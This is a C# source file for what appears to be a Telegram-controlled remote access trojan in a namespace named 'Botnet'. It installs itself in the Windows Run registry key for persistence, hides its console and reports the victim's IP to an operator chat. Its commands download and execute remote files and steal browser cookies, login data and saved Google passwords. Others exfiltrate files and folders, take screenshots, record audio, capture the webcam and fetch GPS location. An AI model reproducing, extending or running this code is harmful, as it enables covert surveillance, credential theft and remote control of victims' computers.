using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Telegram.Bot;

namespace Botnet
{
    class cMain
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        static TelegramSystem ts;
        static Functions funcs;

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        private static string[] commandList = { "/open_link", "/GetGPSLocation", "/download_execute", "/exit", "/ddos", "/GetCookieFile", "/GetSystem", "/GetProcess", "/KillProcess", "/ping","/ls", "/DownloadFile", "/DownloadFolder","/CaptureCam", "/TakeScreenShot", "/GetGooglePasswords", "/OpenFile", "/RecordAudio", "/MessageBox","/help"};

        private static ITelegramBotClient bot;
        public static bool Is64Bit()
        {
            return Marshal.SizeOf(typeof(IntPtr)) == 8;
        }

        static string IP = Functions.GetIp();

        internal delegate void SignalHandler(ConsoleSignal consoleSignal, int vs);

        internal enum ConsoleSignal
        {
            CtrlC = 0,
            CtrlBreak = 1,
            Close = 2,
            LogOff = 5,
            Shutdown = 6
        }

        internal static class ConsoleHelper
        {
            [DllImport("Kernel32", EntryPoint = "SetConsoleCtrlHandler")]
            public static extern bool SetSignalHandler(SignalHandler handler, bool add);
        }

        private static SignalHandler signalHandler;

        static void Main(string[] args)
        {
            ts = new TelegramSystem(config.Token);
            funcs = new Functions(ts);
            Microsoft.Win32.RegistryKey Key =
            Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);

            // добавляем первый параметр - название ключа
            // Второй параметр - это путь к
            // исполняемому файлу нашей программы.
            Key.SetValue(config.currProc, Directory.GetCurrentDirectory());         // "D:\\BotFiles\\TeleRat.exe"
            Key.Close();

            ts.SendMessage($"Bot [{IP}] is online");
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            signalHandler += HandleConsoleSignal;
            ConsoleHelper.SetSignalHandler(signalHandler, true);
            bot = new TelegramBotClient(config.Token);
            bot.OnMessage += OnTelegramMessage;
            bot.StartReceiving();

            Console.ReadKey();
        }

        private static async void OnTelegramMessage(object sender, Telegram.Bot.Args.MessageEventArgs e)
        {
            if(e.Message.Chat.Id == long.Parse(config.Chat_ID))
            {
                if (e.Message.Document != null && e.Message.Caption.Contains("/UploadUpdate"))          // TODO: Сделать разархивирование и запуск файла. Сделать рабочий метод для использования комманды
                {
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BotFiles\\" + e.Message.Document.FileName;
                    Directory.CreateDirectory(path);
                    var file = await bot.GetFileAsync(e.Message.Document.FileId);

                    using (var saveFile = new FileStream(path + "\\" + e.Message.Document.FileName, FileMode.Create))
                    {
                        await bot.DownloadFileAsync(file.FilePath, saveFile);
                    }

                    Process.Start(path);
                }
                else if (e.Message.Document != null && e.Message.Caption == "/UploadExecute")
                {

                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BotFiles\\";
                    Directory.CreateDirectory(path);
                    path += e.Message.Document.FileName;
                    var file = await bot.GetFileAsync(e.Message.Document.FileId);

                    using (var saveFile = new FileStream(path, FileMode.Create))
                    {
                        await bot.DownloadFileAsync(file.FilePath, saveFile);
                    }

                    try
                    {
                        Process.Start(path);
                    }
                    catch
                    {
                        ts.SendMessage($"[ERROR] [{Functions.GetIp()}] Something wrong");
                    }
                }
                else if (e.Message.Document != null)
                {
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BotFiles\\" + e.Message.Document.FileName;
                    Directory.CreateDirectory(path);
                    var file = await bot.GetFileAsync(e.Message.Document.FileId);

                    using (var saveFile = new FileStream(path + "\\" + e.Message.Document.FileName, FileMode.Create))
                    {
                        await bot.DownloadFileAsync(file.FilePath, saveFile);
                    }
                }
                else
                {
                    cmd command = new cmd(e.Message.Text);
                    Execute(command);
                }
            }
        }

        private static void HandleConsoleSignal(ConsoleSignal consoleSignal, int returnedValue)
        {
            ts.SendMessage($"Bot [{IP}] is offline");
            Thread.Sleep(750);
        }

        static void Execute(cmd CMD)
        {
            string text = string.Empty;
            if(File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt"))
            {
                StreamReader reader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt");
                text = reader.ReadToEnd();
                reader.Close();
            }
            else
            {
                StreamWriter Writer = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt");
                Writer.AutoFlush = true;
                Writer.Close();
            }
            if (text == CMD.ComType + "|" + CMD.ComContent)
            {

            }
            else
            {
                switch (CMD.ComType.ToLower())
                {
                    case "/open_link":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /open_link|<link>  (without <>)");
                        else
                            funcs.OpenLink(CMD.ComContent);
                        break;
                    case "/download_execute":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /download_execute|<link>  (without <>)");
                        else
                            funcs.DownloadExecute(CMD.ComContent);
                        break;
                    case "/exit":
                        Environment.Exit(0);
                        break;
                    case "/ddos":
                        break;
                    case "/getcookiefile":
                        funcs.GetCookieAndLoginData();
                        break;
                    case "/getsystem":
                        funcs.GetSystem();
                        break;
                    case "/getprocess":
                        funcs.GetProcess();
                        break;
                    case "/getgpslocation":
                        funcs.GetGPSLocation();
                        break;
                    case "/messagebox":
                        if (CMD.ComContent == null || CMD.ComThreads == null)
                            ts.SendMessage("Usage - /MessageBox|<message>|<caption>  (without <>)");
                        else
                            funcs.ShowMessageBox(CMD.ComContent, CMD.ComThreads);
                        break;
                    case "/killprocess":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /KillProcess|<process name>  (without <>)");
                        else
                            funcs.KillProcess(CMD.ComContent);
                        break;
                    case "/ls":
                        if (CMD.ComContent == null)
                            funcs.GetFiles(Directory.GetCurrentDirectory());
                        else
                            funcs.GetFiles(CMD.ComContent);
                        break;
                    case "/downloadfile":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /DownloadFile|<full path to file>  (without <>)");
                        else
                            funcs.DownloadFile(CMD.ComContent);
                        break;
                    case "/snapshotcam":
                        funcs.SnapShotCam();
                        break;
                    case "/capturemonitor":
                        if(CMD.ComContent == null)
                            ts.SendMessage("Usage - /capturemonitor|<video time>  (without <>)");
                        else
                        {
                            if (int.TryParse(CMD.ComContent, out int delay))
                                funcs.CaptureScreen(delay);
                            else
                                ts.SendMessage("Write correct property!");
                        }
                        break;
                    case "/capturewebcam":                                  // TODO: Capture from Webcam
                        break;
                    case "/takescreenshot":
                        funcs.TakeScreenShot();
                        break;
                    case "/getgooglepasswords":
                        funcs.GetGooglePasswords();
                        break;
                    case "/ping":
                        ts.SendMessage($"[Ping] [{Functions.GetIp()}] I'm up");
                        break;
                    case "/openfile":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /OpenFile|<full path to file>  (without <>)");
                        else
                            Process.Start(CMD.ComContent);
                        break;
                    case "/downloadfolder":
                        if (CMD.ComContent == null)
                            ts.SendMessage("Usage - /DownloadFolder|<full path to folder>  (without <>)");
                        else
                            funcs.DownloadFolder(CMD.ComContent);
                        break;
                    case "/help":
                        funcs.SendCommands();
                        break;
                    case "/recordaudio":
                        if (CMD.ComContent != null)
                            funcs.RecordAudio(CMD.ComContent);
                        else
                            funcs.RecordAudio();
                        break;
                    default:
                        int i = 1;
                        foreach (var command in commandList)
                        {
                            if (CMD.ComType.Contains(command))
                                i = 0;
                        }
                        if (i != 0)
                            funcs.SendCommands();
                        break;
                }
                StreamWriter Writer = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt");
                Writer.AutoFlush = true;
                Writer.Write(CMD.ComType + "|" + CMD.ComContent);
                Writer.Close();
            }
        }
    }
}
